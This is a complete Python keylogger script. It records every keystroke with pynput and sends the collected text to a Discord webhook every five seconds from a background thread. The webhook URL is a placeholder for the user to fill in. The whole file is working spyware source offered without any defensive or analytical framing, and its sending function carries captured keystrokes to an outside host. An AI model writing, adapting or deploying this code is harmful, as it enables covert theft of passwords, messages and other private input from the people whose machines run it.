from pynput import keyboard
import threading
import requests
import time

WEBHOOK_URL = "YOUR_WEBHOOD_URL"
log = ""
lock = threading.Lock()
interval = 5

def send_to_discord(message):
    try:
        data = {"content": message}
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print("Failed to send message:", e)

def log_sender():
    global log
    while True:
        time.sleep(interval)
        with lock:
            if log:
                send_to_discord(log)
                log = ""

def on_press(key):
    global log
    try:
        with lock:
            log += key.char
    except AttributeError:
        with lock:
            if key == key.space:
                log += ' '
            else:
                log += f' [{key}] '

def start_keylogger():
    sender_thread = threading.Thread(target=log_sender, daemon=True)
    sender_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

start_keylogger()
